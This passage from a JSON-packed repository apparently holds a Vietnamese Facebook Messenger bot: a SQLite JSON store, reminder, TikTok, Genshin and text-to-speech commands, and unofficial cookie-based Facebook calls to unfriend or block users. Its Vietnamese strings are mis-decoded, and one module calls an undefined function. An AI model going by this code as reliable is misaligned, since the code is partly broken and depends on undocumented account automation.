(?)`).get(params.id); \n        }\n        if (params.ops.target) {\n            fetched = JSON.parse(fetched.json);\n        try { fetched = JSON.parse(fetched); } catch (e) {}\n            params.data = JSON.parse(params.data);\n        if (typeof fetched !== 'object') throw new TypeError('Cannot push into a non-object.');\n        let oldArray = get(fetched, params.ops.target);\n        if (oldArray === undefined) oldArray = [];\n        else if (!Array.isArray(oldArray)) throw new TypeError('Target is not an array.');\n            oldArray.push(params.data);\n            params.data = set(fetched, params.ops.target, oldArray);\n        } else {\n        if (fetched.json === '{}') fetched.json = [];\n        else fetched.json = JSON.parse(fetched.json);\n        try { fetched.json = JSON.parse(fetched.json); } catch (e) {}\n            params.data = JSON.parse(params.data);\n        if (!Array.isArray(fetched.json)) throw new TypeError('Target is not an array.');\n            fetched.json.push(params.data);\n            params.data = fetched.json;\n        }\n        params.data = JSON.stringify(params.data);\n        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(params.data, params.id);\n        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;\n        if (newData === '{}') return null;\n        else {\n            newData = JSON.parse(newData);\n        try { newData = JSON.parse(newData); } catch (e) {}\n        return newData;\n        }\n    },\n    delete: function deleteDB(db, params, options) {\n        const unset = require('lodash/unset');\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) return false;\n        else fetched = JSON.parse(fetched.json);\n        try { fetched = JSON.parse(fetched); } catch (e) {}\n        if (typeof fetched === 'object' && params.ops.target) {\n            unset(fetched, params.ops.target);\n            fetched = JSON.stringify(fetched);\n            db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(fetched, params.id);\n        return true;\n        }\n        else if (params.ops.target) throw new TypeError('Target is not an object.');\n        else db.prepare(`DELETE FROM ${options.table} WHERE ID = (?)`).run(params.id);\n        return true;\n    },\n    has: function hasDB(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) return false;\n        else fetched = JSON.parse(fetched.json);\n        try { fetched = JSON.parse(fetched); } catch (e) {}\n        if (params.ops.target) fetched = get(fetched, params.ops.target);\n        return (typeof fetched != 'undefined');\n    },\n    all: function allDB(db, params, options) {\n        var stmt = db.prepare(`SELECT * FROM ${options.table} WHERE ID IS NOT NULL`);\n        let resp = [];\n        for (var row of stmt.iterate()) {\n            try {\n            resp.push({\n                ID: row.ID,\n                data: JSON.parse(row.json)\n            });\n            } \n            catch (e) {\n                return [];\n            }\n        }\n        return resp;\n    },\n    type: function typeDB(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) return null; // If empty, return null\n        fetched = JSON.parse(fetched.json);\n        try { fetched = JSON.parse(fetched); } catch (e) {}\n        if (params.ops.target) fetched = get(fetched, params.ops.target); // Get prop using dot notation\n        return typeof fetched;\n    },\n    clear: function clearDB(db, params, options) {\n        let fetched = db.prepare(`DELETE FROM ${options.table}`).run();\n        if(!fetched) return null;\n        return fetched.changes;\n        \n    }\n};\n\n\nfunction arbitrate(method, params) {\n    let options = {table: \"json\"};\n    db.prepare(`CREATE TABLE IF NOT EXISTS ${options.table} (ID TEXT, json TEXT)`).run();\n    if (params.ops.target && params.ops.target[0] === \".\") params.ops.target = params.ops.target.slice(1); // Remove prefix if necessary\n    if (params.data && params.data === Infinity) throw new TypeError(`You cannot set Infinity into the database @ ID: ${params.id}`);\n    if (params.id && typeof params.id == \"string\" && params.id.includes(\".\")) {\n        let unparsed = params.id.split(\".\");\n        params.id = unparsed.shift();\n        params.ops.target = unparsed.join(\".\");\n    }\n    return methods[method](db, params, options);\n}\n\n\nmodule.exports = function ChernobyL(Local) {\n    if (Local && process.env[\"REPL_ID\"]) {\n        return {\n            set: Lset,\n            get: Lget,\n            has: Lhas,\n            delete: Lremove,\n            deleteMultiple: LremoveMultiple,\n            list: Llist\n        };\n    } else if (!Local && process.env[\"REPL_ID\"]) {\n        return {\n            set: Replit_Set,\n            get: Replit_Get,\n            has: Replit_Has,\n            delete: Replit_Remove,\n            deleteMultiple: Replit_RemoveMultiple,\n            list: Replit_List\n        };\n    }\n    else if (Local && !process.env[\"REPL_ID\"]) {\n        return {\n            set: Lset,\n            get: Lget,\n            has: Lhas,\n            delete: Lremove,\n            deleteMultiple: LremoveMultiple,\n            list: Llist\n        };\n    }\n    else if (!Local && !process.env[\"REPL_ID\"]) {\n        return {\n            set: Lset,\n            get: Lget,\n            has: Lhas,\n            delete: Lremove,\n            deleteMultiple: LremoveMultiple,\n            list: Llist\n        };\n    }\n    else {\n        return {\n            set: Lset,\n            get: Lget,\n            has: Lhas,\n            delete: Lremove,\n            deleteMultiple: LremoveMultiple,\n            list: Llist\n        };\n    }\n};","path":null,"size_bytes":17640,"size_tokens":null},"modules/events/leaveNoti.js":{"content":"module.exports.config = {\n  name: \"leaveNoti\",\n  eventType: [\"log:unsubscribe\"],\n  version: \"1.0.2\",\n  credits: \"HƒêGN\",\n  description: \"Th√¥ng b√°o ng∆∞·ªùi r·ªùi kh·ªèi nh√≥m (vƒÉn b·∫£n)\"\n};\n\nmodule.exports.run = async function ({ api, event, Users, Threads }) {\n  if (event.logMessageData.leftParticipantFbId == api.getCurrentUserID()) return;\n\n  const threadID = event.threadID;\n  const iduser = event.logMessageData.leftParticipantFbId;\n  const name = global.data.userName.get(iduser) || await Users.getNameUser(iduser);\n  const type = (event.author == iduser) ? \"ùêëùê®ÃõÃÄùê¢\" : \"ùêÅùê¢Ã£ ùêêùêìùêï ùêäùê¢ùêúùê§\";\n\n  // Th·ªùi gian\n  const moment = require(\"moment-timezone\");\n  const hours = parseInt(moment.tz(\"Asia/Ho_Chi_Minh\").format(\"HH\"));\n  const session = hours <= 10 ? \"ùêíùêöÃÅùêßùê†\" :\n                  hours > 10 && hours <= 12 ? \"ùêìùê´ùêÆÃõùêö\" :\n                  hours > 12 && hours <= 18 ? \"ùêÇùê°ùê¢ùêûÃÇÃÄùêÆ\" : \"ùêìùê®ÃÇÃÅùê¢\";\n  const fullYear = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"YYYY\");\n  const time = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"DD/MM/YYYY || HH:mm:ss\");\n\n  // L·∫•y c·∫•u h√¨nh leaveNoti t·ª´ manager\n  const { readFileSync } = global.nodemodule[\"fs-extra\"];\n  const { join } = global.nodemodule[\"path\"];\n  const pathData = join(__dirname, \"/../commands/data/leaveNoti.json\");\n  let dataJson = [];\n  try { dataJson = JSON.parse(readFileSync(pathData, \"utf-8\")); } catch {}\n  const thisThread = dataJson.find(i => i.threadID == threadID) || { message: null, enable: true };\n  if (!thisThread.enable) return; // n·∫øu t·∫Øt\n\n  // Tin nh·∫Øn r·ªùi\n  let msg = thisThread.message || `ùêìùêöÃ£ùê¶ ùêõùê¢ùêûÃÇÃ£ùê≠ {name} ùêÉÃÑùêöÃÉ {type} ùêäùê°ùê®Ãâùê¢ ùêçùê°ùê®ÃÅùê¶`;\n  msg = msg\n    .replace(/\\{iduser}/g, iduser)\n    .replace(/\\{name}/g, name)\n    .replace(/\\{type}/g, type)\n    .replace(/\\{session}/g, session)\n    .replace(/\\{fullYear}/g, fullYear)\n    .replace(/\\{time}/g, time);\n\n  return api.sendMessage(msg, threadID);\n};\n","path":null,"size_bytes":2021,"size_tokens":null},"modules/commands/say.js":{"content":"module.exports.config = {\n\tname: \"say\",\n\tversion: \"1.0.1\",\n\thasPermssion: 0,\n\tcredits: \"Mirai Team\",\n\tdescription: \"Khi·∫øn bot tr·∫£ v·ªÅ file √¢m thanh c·ªßa ch·ªã google th√¥ng qua vƒÉn b·∫£n\",\n  usePrefix: false,\n\tcommandCategory: \"C√¥ng c·ª•\",\n\tusages: \"[vi/ru/en/ko/ja] [Text]\",\n\tcooldowns: 5,\n\tdependencies: {\n\t\t\"path\": \"\",\n\t\t\"fs-extra\": \"\"\n\t}\n};\n\nmodule.exports.run = async function({ api, event, args }) {\n\ttry {\n\t\tconst { createReadStream, unlinkSync } = global.nodemodule[\"fs-extra\"];\n\t\tconst { resolve } = global.nodemodule[\"path\"];\n\t\tvar content = (event.type == \"message_reply\") ? event.messageReply.body : args.join(\" \");\n\t\tvar languageToSay = ([\"vi\",\"ru\",\"en\",\"ko\",\"ja\"].some(item => content.indexOf(item) == 0)) ? content.slice(0, content.indexOf(\" \")) : global.config.language;\n\t\tvar msg = (languageToSay != global.config.language) ? content.slice(3, content.length) : content;\n\t\tconst path = resolve(__dirname, 'cache', `${event.threadID}_${event.senderID}.mp3`);\n\t\tawait global.utils.downloadFile(`https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(msg)}&tl=${languageToSay}&client=tw-ob`, path);\n\t\treturn api.sendMessage({ attachment: createReadStream(path)}, event.threadID, () => unlinkSync(path));\n\t} catch (e) { return console.log(e) };\n}","path":null,"size_bytes":1287,"size_tokens":null},"lib/fca-auto/src/unfriend.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function unfriend(userID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, friendList) {\n        if (err) return rejectFunc(err);\n        resolveFunc(friendList);\n      };\n    }\n\n    var form = {\n      uid: userID,\n      unref: \"bd_friends_tab\",\n      floc: \"friends_tab\",\n      \"nctr[_mod]\": \"pagelet_timeline_app_collection_\" + ctx.userID + \":2356318349:2\"\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/profile/removefriendconfirm.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"unfriend\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1148,"size_tokens":null},"lib/fca-auto/src/changeBlockedStatus.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function changeBlockedStatus(userID, block, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    defaultFuncs\n      .post(`https://www.facebook.com/messaging/${block ? \"\" : \"un\"}block_messages/`, ctx.jar, { fbid: userID })\n      .then(utils.saveCookies(ctx.jar))\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"changeBlockedStatus\", err);\n        return callback(err);\n      });\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1027,"size_tokens":null},"modules/commands/nhacnho.js":{"content":"const fs = require('fs');\nconst path = require('path');\nconst moment = require('moment-timezone');\nconst schedule = require('node-schedule');\n\nconst dataDir = path.join(__dirname, 'data');\nconst dataFilePath = path.join(dataDir, 'nhacnho.json');\n\nlet scheduledJobs = {};\n\nif (!fs.existsSync(dataDir)) {\n    fs.mkdirSync(dataDir);\n}\n\nfunction loadData() {\n    if (fs.existsSync(dataFilePath)) {\n        try {\n            return JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));\n        } catch (e) {\n            return {};\n        }\n    } else {\n        return {};\n    }\n}\n\nfunction saveData(data) {\n    fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 4));\n}\n\nmodule.exports.config = {\n    name: \"nhacnho\",\n    version: \"1.2.0\",\n    hasPermssion: 3,\n    credits: \"TatsuYTB\",\n    description: \"T·∫°o nh·∫Øc nh·ªü theo ng√†y + gi·ªù k√®m l√Ω do, c√≥ th·ªÉ cancel\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"<s·ªë ng√†y> <gi·ªù:ph√∫t> <l√Ω do> [uid] | cancel\",\n    cooldowns: 5\n};\n\nmodule.exports.run = async function({ api, event, args }) {\n    const userId = event.senderID;\n    let data = loadData();\n\n    // CANCEL (h·ªßy nh·∫Øc nh·ªü c·ªßa ng∆∞·ªùi d√πng)\n    if (args[0] && args[0].toLowerCase() === \"cancel\") {\n        if (scheduledJobs[userId]) {\n            scheduledJobs[userId].cancel();\n            delete scheduledJobs[userId];\n        }\n        if (data[userId]) {\n            delete data[userId];\n            saveData(data);\n        }\n        return api.sendMessage(\"‚èπÔ∏è ƒê√£ h·ªßy t·∫•t c·∫£ nh·∫Øc nh·ªü c·ªßa b·∫°n.\", event.threadID, event.messageID);\n    }\n\n    // Ki·ªÉm tra ƒë·ªß tham s·ªë t·ªëi thi·ªÉu: s·ªë ng√†y & gi·ªù\n    if (args.length < 3) {\n        return api.sendMessage(\n            'Vui l√≤ng nh·∫≠p ƒë·ªß tham s·ªë: <s·ªë ng√†y> <gi·ªù:ph√∫t> <l√Ω do> [uid]\\n' +\n            'V√≠ d·ª•: nhacnho 7 07:30 H·ªçc b√†i nh√≥m 123456789',\n            event.threadID, event.messageID\n        );\n    }\n\n    const numDays = parseInt(args[0]);\n    const time = args[1];\n\n    // N·∫øu th·ªèa ƒëi·ªÅu ki·ªán: n·∫øu arg cu·ªëi c√πng l√† UID (ch·ªâ s·ªë) => l·∫•y l√†m targetUid\n    let targetUid = event.threadID;\n    let reason = \"\";\n\n    const possibleLast = args[args.length - 1];\n    const isUid = /^\\d+$/.test(possibleLast); // simple numeric uid detection\n    if (isUid && args.length >= 4) {\n        targetUid = possibleLast;\n        reason = args.slice(2, args.length - 1).join(' ').trim();\n    } else {\n        reason = args.slice(2).join(' ').trim();\n    }\n\n    if (isNaN(numDays) || !/^\\d{1,2}:\\d{2}$/.test(time) || reason.length === 0) {\n        return api.sendMessage('Tham s·ªë kh√¥ng h·ª£p l·ªá. ƒê·∫£m b·∫£o: s·ªë ng√†y l√† s·ªë, gi·ªù ƒë√∫ng ƒë·ªãnh d·∫°ng HH:MM, v√† c√≥ l√Ω do (reason).', event.threadID, event.messageID);\n    }\n\n    const startDate = moment().format('YYYY-MM-DD');\n    const notifyTime = time;\n\n    // L∆∞u nh·∫Øc nh·ªü (m·ªói user ch·ªâ c√≥ 1 nh·∫Øc nh·ªü). N·∫øu mu·ªën nhi·ªÅu nh·∫Øc nh·ªü/uid kh√°c nhau, c√≥ th·ªÉ m·ªü r·ªông sau.\n    data[userId] = { startDate, numDays, notifyTime, targetUid, reason };\n    saveData(data);\n\n    api.sendMessage(\n        `‚úÖ ƒê√£ thi·∫øt l·∫≠p nh·∫Øc nh·ªü.\\n` +\n        `‚è∞ Th·ªùi gian: m·ªói ng√†y l√∫c ${notifyTime} trong ${numDays} ng√†y\\n` +\n        `üìù L√Ω do: ${reason}\\n` +\n        `üì© N∆°i g·ª≠i: ${targetUid === event.threadID ? \"Nh√≥m hi·ªán t·∫°i\" : `UID ${targetUid}`}`,\n        event.threadID, event.messageID\n    );\n\n    scheduleNotification(api, userId, data[userId]);\n};\n\nfunction scheduleNotification(api, userId, userData) {\n    let { startDate, numDays, notifyTime, targetUid, reason } = userData;\n\n    // H·ªßy job c≈© n·∫øu t·ªìn t·∫°i\n    if (scheduledJobs[userId]) {\n        try { scheduledJobs[userId].cancel(); } catch(e){}\n    }\n\n    let [hour, minute] = notifyTime.split(':');\n\n    const job = schedule.scheduleJob({ hour: parseInt(hour), minute: parseInt(minute) }, function() {\n        let today = moment().format('YYYY-MM-DD');\n        let daysPassed = moment(today).diff(moment(startDate), 'days') + 1;\n\n        if (daysPassed <= numDays) {\n            // G·ª≠i tin nh·∫Øn nh·∫Øc nh·ªü, k√®m l√Ω do\n            const text = `üîî Nh·∫Øc nh·ªü (${daysPassed}/${numDays})\\nL√Ω do: ${reason}\\nNg√†y: ${today}\\nTh·ªùi gian: ${notifyTime}`;\n            // N·∫øu targetUid l√† m·ªôt thread id (kh√¥ng ph·∫£i user id) n√≥ v·∫´n s·∫Ω g·ª≠i v√†o n∆°i ch·ªâ ƒë·ªãnh.\n            api.sendMessage(text, targetUid).catch(() => {});\n        } else {\n            // H·∫øt h·∫°n nh·∫Øc nh·ªü -> x√≥a data v√† job\n            let all = loadData();\n            delete all[userId];\n            saveData(all);\n            try { job.cancel(); } catch(e){}\n            delete scheduledJobs[userId];\n        }\n    });\n\n    scheduledJobs[userId] = job;\n}\n\n// Khi bot kh·ªüi ƒë·ªông l·∫°i, schedule l·∫°i t·∫•t c·∫£ nh·∫Øc nh·ªü ƒë√£ l∆∞u\nmodule.exports.handleEvent = async function({ api }) {\n    let data = loadData();\n    for (let userId in data) {\n        if (!scheduledJobs[userId]) {\n            scheduleNotification(api, userId, data[userId]);\n        }\n    }\n};\n\n// Gi·ªØ l·∫°i helper n·∫øu c·∫ßn\nmodule.exports.convertHMS = function(value) {\n    const sec = parseInt(value, 10);\n    let hours = Math.floor(sec / 3600);\n    let minutes = Math.floor((sec - (hours * 3600)) / 60);\n    let seconds = sec - (hours * 3600) - (minutes * 60);\n    if (hours < 10) { hours = \"0\" + hours; }\n    if (minutes < 10) { minutes = \"0\" + minutes; }\n    if (seconds < 10) { seconds = \"0\" + seconds; }\n    return (hours != '00' ? hours + ':' : '') + minutes + ':' + seconds;\n};\n","path":null,"size_bytes":5594,"size_tokens":null},"modules/commands/vdanime.js":{"content":"module.exports.config = {\n  name: \"vdanime\",\n  version: \"2.0.0\",\n  hasPermssion: 0,\n  Rent: 2,\n  credits: \"Vtuan\",\n  description: \"Xem video v·ªÅ anime chill\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n  const video = require('./../../img/mp4anime.json');\n  const randomVideo = video[Math.floor(Math.random() * video.length)].trim();\n  const fileName = '1.mp4';\n  const filePath = __dirname + `/${fileName}`;\n\n  function downloadAndSendImage(image, fileName, callback) {\n    request(image).pipe(fs.createWriteStream(fileName)).on(\"close\", callback);\n  }\n\n  let callback = function () {\n    return api.sendMessage({\n      body: 'Video anime c·ªßa b·∫°n ƒë√¢y',\n      attachment: [\n        fs.createReadStream(filePath)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(filePath);\n    }, event.messageID);\n  };\n  downloadAndSendImage(randomVideo, filePath, callback);\n}\n","path":null,"size_bytes":1057,"size_tokens":null},"modules/commands/genshin1.js":{"content":"const axios = require('axios');\nconst cheerio = require('cheerio');\n\nmodule.exports.config = {\n    name: \"genshin1\",\n    version: \"1.0.0\",\n    hasPermssion: 3,\n    credits: \"TatsuYTB\",\n    description: \"Fetch information about a Genshin Impact player by UID\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"[UID]\",\n    cooldowns: 5,\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"fetching\": \"ƒêang l·∫•y th√¥ng tin v·ªÅ ng∆∞·ªùi ch∆°i UID %1...\",\n        \"playerNotFound\": \"Kh√¥ng t√¨m th·∫•y th√¥ng tin v·ªÅ ng∆∞·ªùi ch∆°i UID %1.\",\n        \"characterHidden\": \"T√†i kho·∫£n n√†y ƒë√£ ·∫©n th√¥ng tin chi ti·∫øt c·ªßa nh√¢n v·∫≠t.\",\n        \"playerInfo\": \"T√™n: %1\\nC·∫•p ƒë·ªô: %2\\nCh·ªØ k√Ω: %3\\nC·∫•p th·∫ø gi·ªõi: %4\\nS·ªë l∆∞·ª£ng th√†nh t·ª±u: %5\\nLa Ho√†n Th√¢m C·∫£nh: T·∫ßng: %6 - %7\\n\\nDanh s√°ch nh√¢n v·∫≠t c√¥ng khai:\\n%8\\nPh·∫£n h·ªìi theo s·ªë th·ª© t·ª± nh√¢n v·∫≠t ƒë·ªÉ xem th√¥ng tin chi ti·∫øt c·ªßa nh√¢n v·∫≠t ƒë√≥.\"\n    },\n    \"en\": {\n        \"fetching\": \"Fetching information about player UID %1...\",\n        \"playerNotFound\": \"Player UID %1 not found.\",\n        \"characterHidden\": \"This account has hidden character details.\",\n        \"playerInfo\": \"Name: %1\\nLevel: %2\\nSignature: %3\\nWorld Level: %4\\nAchievement Count: %5\\nSpiral Abyss - Floor: %6\\nSpiral Abyss - Level: %7\\n\\nPublic Character List:\\n%8\\nReply with the character number to see detailed information.\"\n    }\n};\n\nconst fetchPlayerInfo = async (uid) => {\n    const url = `https://enka.network/api/uid/${uid}?info`;\n\n    try {\n        const { data } = await axios.get(url);\n\n        if (data.playerInfo) {\n            const playerInfo = data.playerInfo;\n            const nickname = playerInfo.nickname || \"N/A\";\n            const level = playerInfo.level || \"N/A\";\n            const signature = playerInfo.signature || \"N/A\";\n            const worldLevel = playerInfo.worldLevel || \"N/A\";\n            const finishAchievementNum = playerInfo.finishAchievementNum || \"N/A\";\n            const towerFloorIndex = playerInfo.towerFloorIndex || \"N/A\";\n            const towerLevelIndex = playerInfo.towerLevelIndex || \"N/A\";\n\n            return { nickname, level, signature, worldLevel, finishAchievementNum, towerFloorIndex, towerLevelIndex };\n        } else {\n            return null;\n        }\n    } catch (error) {\n        console.error(\"Error fetching player info:\", error);\n        return null;\n    }\n};\n\nconst fetchCharacterInfo = async (uid) => {\n    const url = `https://genshin.aspirine.su/#uid${uid}`;\n\n    try {\n        const { data } = await axios.get(url);\n        console.log(\"HTML loaded successfully\");\n\n        const $ = cheerio.load(data);\n\n        const hiddenInfo = $(\"p:contains('There is no character in Showcase or details are hidden.')\").text();\n        if (hiddenInfo) {\n            console.log(\"Character information is hidden\");\n            return { hidden: true };\n        }\n\n        console.log(\"Parsing character list...\");\n        const characters = [];\n        $('.char-list .item').each((i, element) => {\n            console.log(`Processing character ${i + 1}...`);\n            const name = $(element).find('.name-title .title').text().trim();\n            const level = $(element).find('.name-title .level').text().trim().split(' ')[0];\n            console.log(`Found character: ${name}, Level: ${level}`);\n            characters.push({ name, level });\n        });\n\n        console.log(\"Characters found:\", characters);\n\n        return { hidden: false, characters };\n    } catch (error) {\n        console.error(\"Error fetching character info:\", error);\n        return null;\n    }\n};\n\nmodule.exports.run = async ({ api, event, args, getText }) => {\n    const uid = args[0];\n    if (!uid) {\n        return api.sendMessage(\"Please provide a UID.\", event.threadID, event.messageID);\n    }\n\n    api.sendMessage(getText(\"fetching\", uid), event.threadID, event.messageID);\n\n    const playerInfo = await fetchPlayerInfo(uid);\n    if (!playerInfo) {\n        return api.sendMessage(getText(\"playerNotFound\", uid), event.threadID, event.messageID);\n    }\n\n    const characterInfo = await fetchCharacterInfo(uid);\n\n    const { nickname, level, signature, worldLevel, finishAchievementNum, towerFloorIndex, towerLevelIndex } = playerInfo;\n    let characterList = \"\";\n\n    if (characterInfo.hidden) {\n        characterList = getText(\"characterHidden\");\n    } else if (characterInfo.characters.length > 0) {\n        characterInfo.characters.forEach((char, index) => {\n            characterList += `${index + 1}: ${char.name} | Level ${char.level}\\n`;\n        });\n    }\n\n    console.log(\"Final character list:\", characterList);\n\n    const message = getText(\"playerInfo\", nickname, level, signature, worldLevel, finishAchievementNum, towerFloorIndex, towerLevelIndex, characterList);\n\n    api.sendMessage(message, event.threadID, (err, info) => {\n        if (err) return console.error(err);\n\n        if (characterInfo && !characterInfo.hidden && characterInfo.characters.length > 0) {\n            global.client.handleReply.push({\n                type: 'characterDetail',\n                name: this.config.name,\n                messageID: info.messageID,\n                author: event.senderID,\n                uid,\n                characters: characterInfo.characters\n            });\n        }\n    }, event.messageID);\n};\n\nmodule.exports.handleReply = async ({ api, event, handleReply, getText }) => {\n    if (handleReply.author !== event.senderID) return;\n\n    const characterIndex = parseInt(event.body) - 1;\n    if (isNaN(characterIndex) || characterIndex < 0 || characterIndex >= handleReply.characters.length) {\n        return api.sendMessage(\"Invalid character number.\", event.threadID, event.messageID);\n    }\n\n    const character = handleReply.characters[characterIndex];\n    const characterName = character.name.split(' ').slice(-1)[0];  // Get the last word of the character name (to handle cases like \"Kamisato Ayaka\")\n\n    const characterDetail = await fetchCharacterDetail(handleReply.uid, characterName);\n    if (!characterDetail) {\n        return api.sendMessage(\"Failed to fetch character details.\", event.threadID, event.messageID);\n    }\n\n    api.sendMessage({\n        body: `Character Details for ${character.name}:`,\n        attachment: characterDetail.imageUrl\n    }, event.threadID, event.messageID);\n};\n","path":null,"size_bytes":6337,"size_tokens":null},"modules/commands/tiktok.js":{"content":"const axios = require(\"axios\");\nconst fs = require(\"fs-extra\");\n\nmodule.exports.config = {\n  name: \"tiktok\",\n  version: \"1.0.0\",\n  hasPermission: 0,\n  credits: \"Kz Kh√°nhh\",\n  description: \"T·∫£i video tiktok\",\n  commandCategory: \"Ti·ªán √≠ch\",\n  usage: \"searchtt + t·ª´ kh√≥a t√¨m ki·∫øm, v√≠ d·ª•: .searchtt bu·ªìn\",\n  cooldowns: 5\n};\n\nconst roof = n => +n != +Math.floor(n) ? +Math.floor(n) + 1 : +n;\nconst localeStr = n => ((+n).toLocaleString()).replace(/,/g, '.');\nconst { get } = require('axios');\nconst {\n    createReadStream,\n    mkdirSync,\n    rmdirSync,\n    unlinkSync\n} = require('fs-extra');\nconst {\n    image\n} = require('image-downloader');\n\nmodule.exports.handleReply = async ({ api, event, handleReply }) => {\n    const $ = handleReply;\n    if ($.case == 'runListUserPost') {\n        if (['list'].includes(event.args[0])) {\n            if (event.args[1] > roof($.data.length / 6) || event.args[1] < 1 || isNaN(event.args[1])) return api.sendMessage(`ùóßùóøùóÆùóªùó¥ ${event.args[1]} ùó∏ùóµùóºÃÇùóªùó¥ ùóªùóÆÃÜÃÄùó∫ ùòÅùóøùóºùóªùó¥ ùó±ùóÆùóªùóµ ùòÄùóÆÃÅùó∞ùóµ!`, event.threadID, event.messageID); else return runListUserPost(api, event, $.data, 6, +event.args[1], $.type, $.author);\n        } else return api.sendMessage({ body: $.type ? infoVideoUserPost($.data[event.args[0] - 1]) : infoMusicUserPost($.data[event.args[0] - 1].music_info), attachment: await downStreamURL($.data[event.args[0] - 1][$.type ? 'play' : 'music'], __dirname + `/cache/${event.messageID}.${$.type ? 'mp4' : 'mp3'}`) }, event.threadID, () => unlinkSync(__dirname + `/cache/${event.messageID}.${$.type ? 'mp4' : 'mp3'}`), event.messageID);\n    };\n    const { threadID, messageID, body } = event;\n    if (handleReply.author != event.senderID || !body) return;\n    let args = body.split(' ');\n    switch (handleReply.type) {\n        case 'search':\n            if (isNaN(body)) return;\n            const { videoInfo } = handleReply;\n            const index = parseInt(body) - 1;\n            if (index < 0 || index >= videoInfo.length) return api.sendMessage(\"ùó¶ùóºÃÇÃÅ ùòÅùòÇÃõÃÅ ùòÅùòÇÃ£ ùó∏ùóµùóºÃÇùóªùó¥ ùóµùóºÃõÃ£ùóΩ ùóπùó≤ÃÇ\", threadID, messageID);\n            api.setMessageReaction(\"‚åõ\", event.messageID, () => { }, true);\n            api.unsendMessage(handleReply.messageID);\n\n            const { digg_count, comment_count, play_count, share_count, download_count, duration, region, title, nickname, unique_id, video_url } = videoInfo[index];\n            axios.get(video_url, { responseType: \"stream\" }).then(res => {\n                res.data.pipe(fs.createWriteStream(__dirname + \"/cache/tiktok.mp4\"));\n                res.data.on(\"end\", () => {\n                    api.setMessageReaction(\"‚úÖ\", event.messageID, () => { }, true);\n                    api.sendMessage({ body: `\n====== [ ùêìùêàùêäùêìùêéùêä ] ====\n‚û£ ùòòùò∂ùò∞ÃÇÃÅùò§ ùò®ùò™ùò¢: ${region || 'N/A'}\n‚û£ ùòõùò™ùòµùò≠ùò¶: ${title}\n‚û£ ùòíùò¶ÃÇùòØùò©: ${nickname}\n‚û£ ùòêùòã ùòØùò®ùò∂Ãõùò∞ÃõÃÄùò™ ùò•ùò∂ÃÄùòØùò®: ${unique_id}\n‚û£ ùòìùò∂Ãõùò∞ÃõÃ£ùòµ ùòµùò™ùòÆ: ${digg_count}\n‚û£ ùòõùò∞ÃÇÃâùòØùò® ùò£ùò™ÃÄùòØùò© ùò≠ùò∂ùò¢Ã£ÃÇùòØ: ${comment_count}\n‚û£ ùòìùò∂Ãõùò∞ÃõÃ£ùòµ ùòπùò¶ùòÆ: ${play_count}\n‚û£ ùòìùò∂Ãõùò∞ÃõÃ£ùòµ ùò§ùò©ùò™ùò¢ ùò¥ùò¶Ãâ: ${share_count}\n‚û£ ùòìùò∂Ãõùò∞ÃõÃ£ùòµ ùòµùò¢Ãâùò™: ${download_count}\n‚û£ ùòõùò™ùòÆùò¶: ${duration} gi√¢y`, attachment: fs.createReadStream(__dirname + \"/cache/tiktok.mp4\") }, threadID, () => fs.unlinkSync(__dirname + \"/cache/tiktok.mp4\"), messageID);\n                });\n            }).catch(err => console.log(err));\n            break;\n    }\n};\n\nmodule.exports.run = async ({ api, event, args }) => {\n    api.setMessageReaction(\"‚åõ\", event.messageID, () => { }, true);\n    const search = args.join(\" \");\n    if (!search) return api.sendMessage(\"ùóïùóÆÃ£ùóª ùó∞ùóµùòÇÃõùóÆ ùóªùóµùóÆÃ£ÃÇùóΩ ùòÅùòÇÃõÃÄ ùó∏ùóµùóºÃÅùóÆ ùòÅùó∂ÃÄùó∫ ùó∏ùó∂ùó≤ÃÇÃÅùó∫\", event.threadID);\n    \n    try {\n        const response = await axios.get(`https://www.tikwm.com/api/feed/search`, {\n            params: {\n                keywords: search,\n                count: 12,\n                cursor: 0,\n                HD: 1\n            },\n            headers: {\n                